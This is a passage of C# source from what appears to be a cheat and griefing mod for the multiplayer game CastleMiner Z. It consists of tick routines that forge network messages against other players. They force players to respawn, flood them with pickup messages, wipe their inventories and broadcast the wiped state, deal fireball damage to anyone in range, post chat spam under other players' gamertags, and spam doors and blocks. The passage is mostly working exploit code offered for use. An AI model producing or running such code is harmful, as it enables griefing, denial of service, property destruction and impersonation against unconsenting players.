                CastleMinerZGame.Instance.GameScreen.Day = newTimeFormat;
            }
            catch { }
        }
        #endregion

        #region TICK: Freeze Client Dragon

        // Hard-freeze the client visual so the full dragon stays onscreen.
        public static void DR_FreezeTick()
        {
            var dc = GetDragonClient();
            if (dc == null) return;

            // Nothing to do if not using freeze.
            if (!_drFrozen) return;

            // While thawing, do NOT enforce the frozen pose; let motion/anim happen.
            if (_drThawFramesRemaining > 0)
            {
                _drThawFramesRemaining--;

                // When thaw ends, re-snapshot so the new pose becomes the frozen pose.
                if (_drThawFramesRemaining == 0)
                {
                    _drFreezePos = ToSysVec(dc.LocalPosition);
                    _drFreezeRot = dc.LocalRotation;
                }
                return; // Temporarily NOT enforcing the frozen pose.
            }

            // Enforce frozen pose every frame.
            dc.Visible = true; // Keep full model drawn.

            // Lock transform to snapshot.
            var lp           = ToXnaVec(_drFreezePos);
            dc.LocalPosition = lp;
            dc.LocalRotation = _drFreezeRot;

            // Neutralize interpolation/motion so networking/interp can't drift it.
            dc.TargetPosition           = lp;
            dc.CurrentVelocity          = Vector3.Zero;
            dc.CurrentInterpolationTime = 0f;

            // Optional: Prevent some rigs from "finishing" and hiding bits.
            // if (dc.ClipSpeed <= 0f) dc.ClipSpeed = 0.001f;
        }
        #endregion

        #region TICK: Ride Dragon

        public static void RideDragonTick()
        {
            // Teleport the player to the dragon position.
            var dc = IGMainUI.GetDragonClient();
            if (dc != null)
            {
                // Offset the player up "on-top" of the dragons back.
                var dl = new Vector3(dc.LocalPosition.X,
                                     dc.LocalPosition.Y + 2,
                                     dc.LocalPosition.Z);

                CastleMinerZGame.Instance.LocalPlayer.LocalPosition = dl;
            }
        }
        #endregion

        #region TICK: Force Respawn

        public static void ForceRespawnTick()
        {
            foreach (NetworkGamer networkGamer in CastleMinerZGame.Instance.CurrentNetworkSession.AllGamers) // Iterate through all network gamers.
                if (_forceRespawnTargetMode == PlayerTargetMode.None)                                        // If player mode is 'None', return.
                {
                    return;
                }
                else if (_forceRespawnTargetMode == PlayerTargetMode.AllPlayers)                            // If player mode is 'AllPlayers', restart all.
                {
                    if (networkGamer != CastleMinerZGame.Instance.MyNetworkGamer)                           // Exclude ourselves.
                        RestartLevelPrivate(CastleMinerZGame.Instance.MyNetworkGamer, networkGamer);
                }
                else
                    if (_forceRespawnTargetMode == PlayerTargetMode.Player &&                               // If player mode is 'Player', restart only the
                        IdMatchUtils.ContainsId(_forceRespawnTargetNetids, networkGamer.Id))                             // selected '_forceRespawnTargetNetid' players.
                        RestartLevelPrivate(CastleMinerZGame.Instance.MyNetworkGamer, networkGamer);
        }
        #endregion

        #region TICK: Rapid Items

        public static void RapidItemsTick()
        {
            foreach (NetworkGamer networkGamer in CastleMinerZGame.Instance.CurrentNetworkSession.AllGamers) // Iterate through all network gamers.
                if (_rapidItemsTargetMode == PlayerTargetMode.None)                                          // If player mode is 'None', return.
                {
                    return;
                }
                else if (_rapidItemsTargetMode == PlayerTargetMode.AllPlayers)                               // If player mode is 'AllPlayers', shower all.
                {
                    if (networkGamer != CastleMinerZGame.Instance.MyNetworkGamer)                            // Exclude ourselves.
                        GivePlayerItems(CastleMinerZGame.Instance.MyNetworkGamer, networkGamer, _rapidItemsType, 1);
                }
                else
                    if (_rapidItemsTargetMode == PlayerTargetMode.Player &&                                  // If player mode is 'Player', shower only the
                        IdMatchUtils.ContainsId(_rapidItemsTargetNetids, networkGamer.Id))                   // selected '_rapidItemsTargetNetids' players.
                    {
                        GivePlayerItems(CastleMinerZGame.Instance.MyNetworkGamer, networkGamer, _rapidItemsType, 1);
                        break;
                    }

            void GivePlayerItems(LocalNetworkGamer from, NetworkGamer to, InventoryItemIDs itemID, int amount)
            {
                var sendInstance             = MessageBridge.Get<ConsumePickupMessage>();
                sendInstance.PickupPosition  = ((Player)to?.Tag)?.LocalPosition ?? Vector3.Zero;
                sendInstance.Item            = InventoryItem.CreateItem(itemID, amount);
                sendInstance.PickerUpper     = to.Id;
                sendInstance.SpawnerID       = 0;
                sendInstance.PickupID        = 0;
                sendInstance.DisplayOnPickup = false;

                MessageBridge.DoSendDirect.Invoke(sendInstance, new object[] { from, to });
            }
        }
        #endregion

        #region TICK: Shower

        public static void ShowerTick()
        {
            foreach (NetworkGamer networkGamer in CastleMinerZGame.Instance.CurrentNetworkSession.AllGamers) // Iterate through all network gamers.
                if (_showerTargetMode == PlayerTargetMode.None)                                              // If player mode is 'None', return.
                {
                    return;
                }
                else if (_showerTargetMode == PlayerTargetMode.AllPlayers)                                   // If player mode is 'AllPlayers', shower all.
                {
                    if (networkGamer != CastleMinerZGame.Instance.MyNetworkGamer)                            // Exclude ourselves.
                        DoShowerCycle(networkGamer);
                }
                else
                    if (_showerTargetMode == PlayerTargetMode.Player &&                                      // If player mode is 'Player', shower only the
                        IdMatchUtils.ContainsId(_showerTargetNetids, networkGamer.Id))                       // selected '_showerTargetNetids' players.
                    {
                        DoShowerCycle(networkGamer);
                        break;
                    }

            void DoShowerCycle(NetworkGamer target)
            {
                // Spawn items in a 3x3 square; three blocks above the player.
                const int radius = 3;
                const int halfradius = radius / 2; // Calculate half the radius for centering.

                for (int x = -halfradius; x < radius - halfradius; ++x)
                {
                    for (int z = -halfradius; z < radius - halfradius; ++z)
                    {
                        Vector3 playerPos = ((Player)target?.Tag)?.LocalPosition ?? Vector3.Zero;
                        Vector3 newPos    = Vector3.Add(new Vector3(playerPos.X, playerPos.Y + 3, playerPos.Z), new Vector3(x, 0, z));

                        // Spawn item.
                        ConsumePickupPrivate(CastleMinerZGame.Instance.MyNetworkGamer, target, newPos, _showerType, 1);
                    }
                }
            }

            void ConsumePickupPrivate(LocalNetworkGamer from, NetworkGamer to, Vector3 spawnPosition, InventoryItemIDs item, int amount)
            {
                var targetPlayer = (Player)to.Tag;
                var sendInstance = MessageBridge.Get<ConsumePickupMessage>();

                sendInstance.PickupPosition  = spawnPosition;
                sendInstance.Item            = InventoryItem.CreateItem(item, amount);
                sendInstance.PickupID        = _globalPickupIdCounter;
                sendInstance.SpawnerID       = _globalSpawnerIdCounter;
                sendInstance.PickerUpper     = targetPlayer.Gamer.Id;
                sendInstance.DisplayOnPickup = false;

                // Advance the pickup & spawer ids.
                _globalPickupIdCounter++;
                _globalSpawnerIdCounter++;

                MessageBridge.DoSendDirect.Invoke(sendInstance, new object[] { from, to });
            }
        }
        #endregion

        #region TICK: Reliable Flood

        public static void ReliableFloodTick()
        {
            foreach (NetworkGamer networkGamer in CastleMinerZGame.Instance.CurrentNetworkSession.AllGamers) // Iterate through all network gamers.
                if (_reliableFloodTargetMode == PlayerTargetMode.None)                                       // If player mode is 'None', return.
                {
                    return;
                }
                else if (_reliableFloodTargetMode == PlayerTargetMode.AllPlayers)                            // If player mode is 'AllPlayers', flood all.
                {
                    for (int y = 1; y < _reliableFloodBurstValue + 1; y++)                                   // Message burst amount.
                        if (networkGamer != CastleMinerZGame.Instance.MyNetworkGamer)                        // Exclude ourselves.
                            PrivateCreatePickup(CastleMinerZGame.Instance.MyNetworkGamer, networkGamer, InventoryItemIDs.BloodstonePickAxe, 1);
                }
                else
                    if (_reliableFloodTargetMode == PlayerTargetMode.Player &&                               // If player mode is 'Player', flood only the
                        IdMatchUtils.ContainsId(_reliableFloodTargetNetids, networkGamer.Id))                             // selected '_reliableFloodTargetNetids' players.
                    {
                        for (int y = 1; y < _reliableFloodBurstValue + 1; y++)                               // Message burst amount.
                            PrivateCreatePickup(CastleMinerZGame.Instance.MyNetworkGamer, networkGamer, InventoryItemIDs.BloodstonePickAxe, 1);
                        break;
                    }

            void PrivateCreatePickup(LocalNetworkGamer from, NetworkGamer to, InventoryItemIDs itemID, int amount)
            {
                var sendInstance             = MessageBridge.Get<CreatePickupMessage>();
                sendInstance.SpawnPosition   = ((Player)to?.Tag)?.LocalPosition ?? Vector3.Zero;
                sendInstance.SpawnVector     = Vector3.Down;
                sendInstance.Item            = InventoryItem.CreateItem(itemID, amount);
                sendInstance.Dropped         = true;
                sendInstance.DisplayOnPickup = false;
                sendInstance.PickupID        = _globalPickupIdCounter; // GenerateRandomNumber(0, int.MaxValue);

                // Advance the entity pickup count.
                _globalPickupIdCounter++;

                MessageBridge.DoSendDirect.Invoke(sendInstance, new object[] { from, to });
            }
        }
        #endregion

        #region TICK: Hug

        public static void HugTick()
        {
            foreach (NetworkGamer networkGamer in CastleMinerZGame.Instance.CurrentNetworkSession.AllGamers) // Iterate through all network gamers.
                if (_hugTargetMode == PlayerTargetMode.None)                                                 // If player mode is 'None', return.
                {
                    return;
                }
                else if (_hugTargetMode == PlayerTargetMode.AllPlayers)                                      // If player mode is 'AllPlayers', shower all.
                {
                    if (networkGamer != CastleMinerZGame.Instance.MyNetworkGamer)                            // Exclude ourselves.
                        HugPlayer(networkGamer);
                }
                else
                    if (_hugTargetMode == PlayerTargetMode.Player &&                                         // If player mode is 'Player', shower only the
                        _hugTargetNetid == networkGamer.Id)                                                  // selected '_showerTargetNetids' players.
                    {
                        HugPlayer(networkGamer);
                        break;
                    }

            void HugPlayer(NetworkGamer target)
            {
                var ourPlayerPosition = CastleMinerZGame.Instance?.LocalPlayer?.LocalPosition ?? Vector3.Zero;
                var playerPosition    = ((Player)target?.Tag)?.LocalPosition ?? Vector3.Zero;
                var targetPosition    = playerPosition;

                // First ensure we are physicaly within a 200 block distance of the player.
                // This is importnant in ensuring our model is teleported to the player.
                if (Vector2.Distance(new Vector2(ourPlayerPosition.X, ourPlayerPosition.Z), new Vector2(playerPosition.X, playerPosition.Z)) > 200)
                    CastleMinerZGame.Instance.GameScreen.TeleportToLocation(playerPosition, true);

                if (_hugSpreadValue > 0)
                {
                    // Generate a random position within the given radius size.
                    int baseX = (int)Math.Floor(playerPosition.X);
                    int baseY = (int)Math.Floor(playerPosition.Y);
                    int baseZ = (int)Math.Floor(playerPosition.Z);

                    int randomX = GenerateRandomNumberInclusive(baseX - _hugSpreadValue, baseX + _hugSpreadValue);
                    int randomY = GenerateRandomNumberInclusive(baseY - _hugSpreadValue, baseY + _hugSpreadValue);
                    int randomZ = GenerateRandomNumberInclusive(baseZ - _hugSpreadValue, baseZ + _hugSpreadValue);

                    // Update the position.
                    targetPosition = new Vector3(randomX, randomY, randomZ);
                }

                // If spread is 0, always force yourself on the targets location.
                if (_hugSpreadValue == 0)
                {
                    // CastleMinerZGame.Instance.LocalPlayer.LocalPosition = targetPosition;
                    _hugLocation = targetPosition;
                    return;
                }

                // Try and find a valid air location from -Y to +Y.
                const int WORLD_Y_MIN = -64, WORLD_Y_MAX = 64;
                int startY   = ClampInt((int)Math.Floor(targetPosition.Y), WORLD_Y_MIN, WORLD_Y_MAX);
                int minimumY = ClampInt(startY - _hugSpreadValue, WORLD_Y_MIN, WORLD_Y_MAX);
                int maximumY = ClampInt(startY + _hugSpreadValue, WORLD_Y_MIN, WORLD_Y_MAX);

                // Try down first, then up.
                if (TryFindStandable(targetPosition.X, targetPosition.Z, startY, minimumY, -1, out var standPos) ||
                    TryFindStandable(targetPosition.X, targetPosition.Z, startY, maximumY, +1, out standPos))
                {
                    // Position is valid, teleport user.
                    // CastleMinerZGame.Instance.LocalPlayer.LocalPosition = standPos;
                    _hugLocation = standPos;
                    return;
                }

                // Last resort: No valid air location found for this location, teleport to surface location.
                // CastleMinerZGame.Instance.GameScreen.TeleportToLocation(targetPosition, true);
                _hugLocation = CastleMinerZGame.Instance._terrain.FindTopmostGroundLocation(targetPosition);
            }

            #region Helpers

            /// <summary>
            /// Clamp an integer to an inclusive range.
            /// Notes:
            /// - Used to keep Y (or any value) inside safe world bounds (ex: -64..64).
            /// - Equivalent to: if (v < lo) v = lo; else if (v > hi) v = hi;
            /// </summary>
            int ClampInt(int v, int lo, int hi) => Math.Min(hi, Math.Max(lo, v));

            /// <summary>
            /// Scan vertically at a fixed (x,z) to find a "standable" spot:
            /// - A solid ground block at (x, y, z)
            /// - PLUS two empty blocks above it at (x, y+1, z) and (x, y+2, z)
            ///
            /// Returns:
            /// - true  and outputs standPos = (x, y+1, z) when a valid spot is found (stand on top of ground)
            /// - false if no valid spot exists within the scan range
            ///
            /// Parameters:
            /// - yStart: Starting Y to scan from (often random or current Y).
            /// - yEnd:   End Y bound to stop at (inclusive).
            /// - step:   Direction (+1 scans upward, -1 scans downward).
            ///
            /// Notes / Safety:
            /// - WORLD_Y_MAX guard prevents probing y+2 beyond the top of the world height.
            /// - This checks a 2-block-tall clearance which matches typical player height assumptions.
            /// - This does not validate X/Z world bounds (assumes caller provides sane x/z).
            /// </summary>
            bool TryFindStandable(float x, float z, int yStart, int yEnd, int step, out Vector3 standPos)
            {
                const int WORLD_Y_MAX = 64;

                standPos = default;

                for (int y = yStart; step < 0 ? (y >= yEnd) : (y <= yEnd); y += step)
                {
                    // Need room for y+1 and y+2 in-world.
                    if (y + 2 > WORLD_Y_MAX) continue;

                    var ground = new Vector3(x, y, z);
                    if (InGameHUD.GetBlock((IntVector3)ground) == BlockTypeEnum.Empty)
                        continue;

                    var air1 = new Vector3(x, y + 1, z);
                    var air2 = new Vector3(x, y + 2, z);

                    if (InGameHUD.GetBlock((IntVector3)air1) == BlockTypeEnum.Empty &&
                        InGameHUD.GetBlock((IntVector3)air2) == BlockTypeEnum.Empty)
                    {
                        standPos = air1; // Stand on top of ground.
                        return true;
                    }
                }

                return false;
            }
            #endregion
        }
        #endregion

        #region TICK: Hat

        public static BlockTypeEnum? oldWearBlockType     = null;
        public static Vector3?       oldWearBlockLocation = null;
        public static void WearTick()
        {
            var isBoots         = _bootsEnabled;
            var playerLocation = new Vector3((int)Math.Floor(CastleMinerZGame.Instance?.LocalPlayer?.LocalPosition.X                       ?? 0f),
                                             (int)Math.Floor(CastleMinerZGame.Instance?.LocalPlayer?.LocalPosition.Y + (isBoots ? 0f : 1f) ?? 0f),
                                             (int)Math.Floor(CastleMinerZGame.Instance?.LocalPlayer?.LocalPosition.Z                       ?? 0f));
            var blockAtLocation = InGameHUD.GetBlock((IntVector3)playerLocation);

            // If the location is new, and the desired wear type is not at this location,
            // remove old wear, place new one.
            if (playerLocation != oldWearBlockLocation && blockAtLocation != _wearType)
            {
                // Restore the old block.
                if (oldWearBlockLocation != null)
                {
                    // Place the previous locations "original" block back.
                    PlaceBlocksAllExcept(CastleMinerZGame.Instance.MyNetworkGamer, (IntVector3)(Vector3)oldWearBlockLocation, (BlockTypeEnum)oldWearBlockType, CastleMinerZGame.Instance.MyNetworkGamer);
                }

                // Always update the old block & location.
                oldWearBlockType     = blockAtLocation;
                oldWearBlockLocation = playerLocation;

                // Place wear block at location for all players but ourselves.
                PlaceBlocksAllExcept(CastleMinerZGame.Instance.MyNetworkGamer, (IntVector3)playerLocation, _wearType, CastleMinerZGame.Instance.MyNetworkGamer);
            }
        }
        #endregion

        #region TICK: Disable Controls

        public static void DisableControlsTick()
        {
            foreach (NetworkGamer networkGamer in CastleMinerZGame.Instance.CurrentNetworkSession.AllGamers) // Iterate through all network gamers.
                if (_disableControlsTargetMode == PlayerTargetMode.None)                                     // If player mode is 'None', return.
                {
                    return;
                }
                else if (_disableControlsTargetMode == PlayerTargetMode.AllPlayers)                          // If player mode is 'AllPlayers', shower all.
                {
                    if (networkGamer != CastleMinerZGame.Instance.MyNetworkGamer)                            // Exclude ourselves.
                        ClearPlayersInventory(networkGamer);
                }
                else
                    if (_disableControlsTargetMode == PlayerTargetMode.Player &&                             // If player mode is 'Player', shower only the
                        IdMatchUtils.ContainsId(_disableControlsTargetNetids, networkGamer.Id))              // selected '_disableControlsTargetNetids' players.
                    {
                        ClearPlayersInventory(networkGamer);
                        break;
                    }

            void ClearPlayersInventory(NetworkGamer to)
            {
                // Get the player object from networkgamer.
                if (!(to.Tag is Player player))
                    return;

                var inv = player.PlayerInventory;
                if (inv == null)
                    return;

                // Clear hotbars (all trays for this inventory).
                var trays = inv.TrayManager;
                if (trays?.Trays != null)
                {
                    int t0 = trays.Trays.GetLength(0);
                    int t1 = trays.Trays.GetLength(1);

                    for (int t = 0; t < t0; t++)
                    {
                        for (int s = 0; s < t1; s++)
                        {
                            trays.Trays[t, s] = null;
                        }
                    }
                }

                // Clear backpack.
                if (inv.Inventory != null)
                {
                    for (int i = 0; i < inv.Inventory.Length; i++)
                    {
                        inv.Inventory[i] = null;
                    }
                }

                // Mutate authoritative inventory.
                InventoryRetrieveFromServerPrivate(CastleMinerZGame.Instance.MyNetworkGamer, to);
            }

            void InventoryRetrieveFromServerPrivate(LocalNetworkGamer from, NetworkGamer to)
            {
                // Runtime type for the internal message.
                Type InvRetrieveMsgType = AccessTools.TypeByName("DNA.CastleMinerZ.Net.InventoryRetrieveFromServerMessage");

                // Static Send(from, Player, bool) method.
                MethodInfo InvRetrieveSendMethod =
                    InvRetrieveMsgType != null
                        ? AccessTools.Method(
                            InvRetrieveMsgType,
                            "Send",
                            new[] { typeof(LocalNetworkGamer), typeof(Player), typeof(bool) })
                        : null;

                // Broadcast this player's cleared inventory to all clients.
                if (InvRetrieveSendMethod != null)
                {
                    var targetPlayer = (Player)to.Tag;
                    try { InvRetrieveSendMethod.Invoke(null, new object[] { from, targetPlayer, false }); }
                    catch { /* Swallow.*/ }
                }
            }
        }
        #endregion

        #region TICK: Trail

        public static void TrailTick()
        {
            foreach (NetworkGamer networkGamer in CastleMinerZGame.Instance.CurrentNetworkSession.AllGamers)        // Iterate through all network gamers.
                if (_trailTargetMode == PlayerTargetMode.None)                                                      // If player mode is 'None', return.
                {
                    return;
                }
                else if (_trailTargetMode == PlayerTargetMode.AllPlayers)                                           // If player mode is 'AllPlayers', shower all.
                {
                    if (networkGamer != CastleMinerZGame.Instance.MyNetworkGamer)                                   // Exclude ourselves.
                        if (InGameHUD.GetBlock((IntVector3)((Player)networkGamer.Tag).LocalPosition) != _trailType) // Dont waste performance on existing locations.
                            if (_trailPrivateEnabled)                                                               // If private mode, send torches private.
                                PlaceBlocksPrivate(CastleMinerZGame.Instance?.MyNetworkGamer, (IntVector3)((Player)networkGamer.Tag).LocalPosition, _trailType, networkGamer);
                            else
                                AlterBlockMessage.Send(CastleMinerZGame.Instance?.MyNetworkGamer, (IntVector3)((Player)networkGamer.Tag).LocalPosition, _trailType);
                }
                else
                    if (_trailTargetMode == PlayerTargetMode.Player &&                                              // If player mode is 'Player', shower only the
                        IdMatchUtils.ContainsId(_trailTargetNetids, networkGamer.Id))                               // selected '_trailTargetNetids' players.
                    {
                        if (InGameHUD.GetBlock((IntVector3)((Player)networkGamer.Tag).LocalPosition) != _trailType) // Dont waste performance on existing locations.
                            if (_trailPrivateEnabled)                                                               // If private mode, send torches private.
                                PlaceBlocksPrivate(CastleMinerZGame.Instance?.MyNetworkGamer, (IntVector3)((Player)networkGamer.Tag).LocalPosition, _trailType, networkGamer);
                            else
                                AlterBlockMessage.Send(CastleMinerZGame.Instance?.MyNetworkGamer, (IntVector3)((Player)networkGamer.Tag).LocalPosition, _trailType);
                        break;
                    }
        }
        #endregion

        #region TICK: Item Vortex

        public static void ItemVortexTick()
        {
            var baseLocation = _itemVortexLocation;
            var toLocation   = new Vector3(0, _beaconHeightValue, 0);

            if (_beaconModeEnabled)
            {
                CreatePickupMessage.Send(CastleMinerZGame.Instance?.MyNetworkGamer, baseLocation, toLocation, _globalPickupIdCounter, InventoryItem.CreateItem(_itemVortexType, 1), true, false);

                // Advance the global pickup ids.
                _globalPickupIdCounter++;

                return;
            }

            foreach (NetworkGamer networkGamer in CastleMinerZGame.Instance.CurrentNetworkSession.AllGamers) // Iterate through all network gamers.
                if (_itemVortexTargetMode == PlayerTargetMode.None)                                          // If player mode is 'None', return.
                {
                    return;
                }
                else if (_itemVortexTargetMode == PlayerTargetMode.AllPlayers)                               // If player mode is 'AllPlayers', shower all.
                {
                    if (networkGamer != CastleMinerZGame.Instance.MyNetworkGamer)                            // Exclude ourselves.
                        SpawnItemVortex(networkGamer?.Id ?? 0);
                }
                else
                    if (_itemVortexTargetMode == PlayerTargetMode.Player &&                                  // If player mode is 'Player', shower only the
                        IdMatchUtils.ContainsId(_itemVortexTargetNetids, networkGamer.Id))                   // selected '_itemVortexTargetNetids' players.
                    {
                        SpawnItemVortex(networkGamer?.Id ?? 0);
                        break;
                    }

            void SpawnItemVortex(byte to)
            {
                // Spawn item pickup.
                ConsumePickupMessage.Send(CastleMinerZGame.Instance?.MyNetworkGamer, to, baseLocation, _globalSpawnerIdCounter, _globalPickupIdCounter, InventoryItem.CreateItem(_itemVortexType, 1), false);

                // Advance the global spawner and pickup ids.
                _globalSpawnerIdCounter++;
                _globalPickupIdCounter++;
            }
        }
        #endregion

        #region TICK: Chaos Mode (Clock / Dragon)

        #region TICK: Clock

        #region Clock State

        // false = next step is "set 1f"
        // true  = next step is "set random time"
        private static bool _clockDiscordPendingRandom = false;

        // Next allowed run time for the clock cycle.
        private static double _clockDiscordNextMs = 0;

        #endregion

        /// <summary>
        /// Summary:
        /// Discord-clock timer behavior using a two-phase cycle:
        /// 1) Set world time to 1f.
        /// 2) On the next allowed interval, set a random time.
        /// Then repeat.
        /// </summary>
        public static void ClockDiscordTick()
        {
            try
            {
                var game = CastleMinerZGame.Instance;

                if (game?.CurrentNetworkSession == null)
                {
                    _clockDiscordEnabled       = false;
                    _clockDiscordPendingRandom = false;
                    _clockDiscordNextMs        = 0;
                    return;
                }

                float newTime;

                // Phase 1: Set the time to 1f (midnight).
                if (!_clockDiscordPendingRandom)
                {
                    newTime = 1f;
                    _clockDiscordPendingRandom = true;
                }
                // Phase 2: Set a random (mid-day) time.
                else
                {
                    newTime = (float)GenerateRandomNumberInclusive(0, 8000000) + 0.5f;
                    _clockDiscordPendingRandom = false;
                }

                // Check if we are host.
                if (!CastleMinerZGame.Instance.CurrentNetworkSession.IsHost)
                    TimeOfDayMessage.Send(CastleMinerZGame.Instance.MyNetworkGamer, newTime); // Send the new time globally.

                // Always sync locally.
                game.GameScreen.Day = newTime;
            } catch { }
        }
        #endregion

        public static void ChaosTick()
        {
            #region TICK: Dragon

            if (_dragonDiscordEnabled)
            {
                // Spawn a random dragon.
                SpawnDragonMessage.Send(CastleMinerZGame.Instance.MyNetworkGamer, CastleMinerZGame.Instance.MyNetworkGamer?.Id ?? 0, (DragonTypeEnum)GenerateRandomNumberInclusive(0, 4), false, -1);

                // Instantly slay the dragon.
                KillDragonMessage.Send(CastleMinerZGame.Instance.MyNetworkGamer, EnemyManager.Instance.DragonPosition, CastleMinerZGame.Instance.MyNetworkGamer.Id, InventoryItemIDs.DiamondSpacePumpShotgun);
            }
            #endregion
        }
        #endregion

        #region TICK: Spam Text

        /// <summary>
        /// Periodic text action for the Spam Text feature.
        /// </summary>
        public static void SpamTextTick()
        {
            if (string.IsNullOrWhiteSpace(_spamTextMessage))
                return;

            foreach (NetworkGamer networkGamer in CastleMinerZGame.Instance.CurrentNetworkSession.AllGamers) // Iterate through all network gamers.
                if (_spamTextTargetMode == PlayerTargetMode.None)                                            // If player mode is 'None', run anonymous.
                {
                    BroadcastTextMessage.Send(CastleMinerZGame.Instance.MyNetworkGamer, $"{_spamTextMessage}");
                    return;
                }
                else if (_spamTextTargetMode == PlayerTargetMode.AllPlayers)                                 // If player mode is 'AllPlayers', sudo each player.
                {
                    BroadcastTextMessage.Send(CastleMinerZGame.Instance.MyNetworkGamer, $"{networkGamer.Gamertag}: {_spamTextMessage}");
                }
                else
                    if (_spamTextTargetMode == PlayerTargetMode.Player &&                                    // If player mode is 'Player', sudo only the
                        _spamTextTargetNetid == networkGamer.Id)                                             // selected '_spamTextTargetNetid' player.
                    {
                        BroadcastTextMessage.Send(CastleMinerZGame.Instance.MyNetworkGamer, $"{networkGamer.Gamertag}: {_spamTextMessage}");
                        break;
                    }
        }
        #endregion

        #region TICK: Door Spam

        public static void DoorSpamTick()
        {
            foreach (NetworkGamer networkGamer in CastleMinerZGame.Instance.CurrentNetworkSession.AllGamers) // Iterate through all network gamers.
                if (_doorSpamTargetMode == PlayerTargetMode.None)                                            // If player mode is 'None', return.
                {
                    return;
                }
                else if (_doorSpamTargetMode == PlayerTargetMode.AllPlayers)                                 // If player mode is 'AllPlayers', shower all.
                {
                    if (networkGamer != CastleMinerZGame.Instance.MyNetworkGamer)                            // Exclude ourselves.
                        DoDoorSpam(networkGamer);
                }
                else
                    if (_doorSpamTargetMode == PlayerTargetMode.Player &&                                    // If player mode is 'Player', shower only the
                        IdMatchUtils.ContainsId(_doorSpamTargetNetids, networkGamer.Id))                     // selected '_showerTargetNetids' players.
                    {
                        DoDoorSpam(networkGamer);
                        break;
                    }

            void DoDoorSpam(NetworkGamer target)
            {
                try
                {
                    for (int burst = 0; burst <= 10; burst++)
                    {
                        DoorOpenClosePrivate(CastleMinerZGame.Instance.MyNetworkGamer, target, true);
                        DoorOpenClosePrivate(CastleMinerZGame.Instance.MyNetworkGamer, target, false);
                    }
                }
                catch { }
            }

            void DoorOpenClosePrivate(LocalNetworkGamer from, NetworkGamer to, bool opened)
            {
                Type _doorOpenCloseMessageType =
                    AccessTools.TypeByName("DNA.CastleMinerZ.Net.DoorOpenCloseMessage");

                FieldInfo _doorOpenCloseLocationField =
                    _doorOpenCloseMessageType != null
                        ? AccessTools.Field(_doorOpenCloseMessageType, "Location")
                        : null;

                FieldInfo _doorOpenCloseOpenedField =
                    _doorOpenCloseMessageType != null
                        ? AccessTools.Field(_doorOpenCloseMessageType, "Opened")
                        : null;

                if (_doorOpenCloseMessageType == null || _doorOpenCloseLocationField == null || _doorOpenCloseOpenedField == null)
                    return;

                if (!(to?.Tag is Player targetPlayer))
                    return;

                var sendInstance = MessageBridge.Get(_doorOpenCloseMessageType);
                if (sendInstance == null)
                    return;

                _doorOpenCloseLocationField.SetValue(sendInstance, (IntVector3)targetPlayer.LocalPosition);
                _doorOpenCloseOpenedField.SetValue(sendInstance, opened);

                MessageBridge.DoSendDirect.Invoke(sendInstance, new object[] { from, to });
            }
        }
        #endregion

        #region TICK: Death Aura

        /// <summary>
        /// Damages every valid remote player within the configured death-aura range.
        ///
        /// Notes:
        /// - Uses X/Z distance only.
        /// - Skips self, dead players, and invisible players.
        /// - Sends one fireball hit per tick to each target in range.
        /// </summary>
        public static void DeathAuraTick()
        {
            if (!_deathAuraEnabled)
                return;

            var game        = CastleMinerZGame.Instance;
            var session     = game?.CurrentNetworkSession;
            var localPlayer = game?.LocalPlayer;

            if (game == null || session == null || !(game?.MyNetworkGamer is LocalNetworkGamer from) || localPlayer == null)
                return;

            // if (game.PVPState == CastleMinerZGame.PVPEnum.Off) return;

            float range   = Math.Max(0f, _deathAuraRange);
            float rangeSq = range * range;

            Vector2 localXZ = new Vector2(localPlayer.LocalPosition.X, localPlayer.LocalPosition.Z);

            foreach (NetworkGamer networkGamer in session.AllGamers)
            {
                if (!IsValidDeathAuraTarget(networkGamer, localPlayer, game))
                    continue;

                Player targetPlayer = (Player)networkGamer.Tag;
                Vector2 targetXZ = new Vector2(targetPlayer.LocalPosition.X, targetPlayer.LocalPosition.Z);

                if (Vector2.DistanceSquared(localXZ, targetXZ) > rangeSq)
                    continue;

                SendFireballDamagePrivate(from, networkGamer, DragonTypeEnum.SKELETON);
            }
        }

        /// <summary>
        /// Returns true if the gamer is a valid death-aura target.
        /// </summary>
        private static bool IsValidDeathAuraTarget(
            NetworkGamer     networkGamer,
            Player           localPlayer,
            CastleMinerZGame game)
        {
            if (networkGamer == null)
                return false;

            if (networkGamer == game.MyNetworkGamer)
                return false;

            if (!(networkGamer.Tag is Player targetPlayer))
                return false;

            if (targetPlayer == localPlayer)
                return false;

            if (!targetPlayer.ValidLivingGamer)
                return false;

            if (targetPlayer.Dead)
                return false;

            if (!targetPlayer.Visible)
                return false;

            return true;
        }
        #endregion

        #region TICK: Begone Aura

        /// <summary>
        /// Restarts every valid remote player within the configured begone-aura range.
        ///
        /// Notes:
        /// - Uses X/Z distance only.
        /// - Skips self, dead players, and invisible players.
        /// - Sends one restart per tick to each target in range.
        /// </summary>
        public static void BegoneAuraTick()
        {
            if (!_begoneAuraEnabled)
                return;

            var game        = CastleMinerZGame.Instance;
            var session     = game?.CurrentNetworkSession;
            var localPlayer = game?.LocalPlayer;

            if (game == null || session == null || !(game?.MyNetworkGamer is LocalNetworkGamer from) || localPlayer == null)
                return;

            float range   = Math.Max(0f, _begoneAuraRange);
            float rangeSq = range * range;

            Vector2 localXZ = new Vector2(localPlayer.LocalPosition.X, localPlayer.LocalPosition.Z);

            foreach (NetworkGamer networkGamer in session.AllGamers)
            {
                if (!IsValidBegoneAuraTarget(networkGamer, localPlayer, game))
                    continue;

                Player targetPlayer = (Player)networkGamer.Tag;
                Vector2 targetXZ = new Vector2(targetPlayer.LocalPosition.X, targetPlayer.LocalPosition.Z);

                if (Vector2.DistanceSquared(localXZ, targetXZ) > rangeSq)
                    continue;

                RestartLevelPrivate(from, networkGamer);
            }
        }

        /// <summary>
        /// Returns true if the gamer is a valid begone-aura target.
        /// </summary>
        private static bool IsValidBegoneAuraTarget(
            NetworkGamer     networkGamer,
            Player           localPlayer,
            CastleMinerZGame game)
        {
            if (networkGamer == null)
                return false;

            if (networkGamer == game.MyNetworkGamer)
                return false;

            if (!(networkGamer.Tag is Player targetPlayer))
                return false;

            if (targetPlayer == localPlayer)
                return false;

            if (!targetPlayer.ValidLivingGamer)
                return false;

            if (targetPlayer.Dead)
                return false;

            if (!targetPlayer.Visible)
                return false;

            return true;
        }
        #endregion

        #region Block Nuker

        /// <summary>
        /// Removes blocks in a cube around the local player using AlterBlockMessage.
        ///
        /// Notes:
        /// - Range is measured in whole blocks from the center block.
        /// - A range of 1 removes a 3x3x3 area.
        /// - Sends one network block-change message per block.
        /// - This can be very spammy at larger ranges, so keep the range reasonable.
        /// </summary>
        public static void BlockNukerTick()
        {
